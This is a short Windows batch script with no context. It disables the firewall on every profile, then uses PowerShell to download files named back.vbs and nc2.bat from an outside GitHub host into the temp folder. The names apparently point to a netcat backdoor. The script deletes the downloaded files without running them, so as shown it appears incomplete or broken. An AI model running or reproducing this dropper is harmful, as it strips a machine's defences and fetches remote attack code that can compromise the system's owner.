netsh advfirewall set allprofiles state off
cd %TEMP%
del back.vbs
del nc.bat
del nc2.bat
powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/back.vbs','back.vbs')
powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/nc2.bat','nc2.bat')
del back.vbs
del nc.bat
del nc2.bat
cls
exit
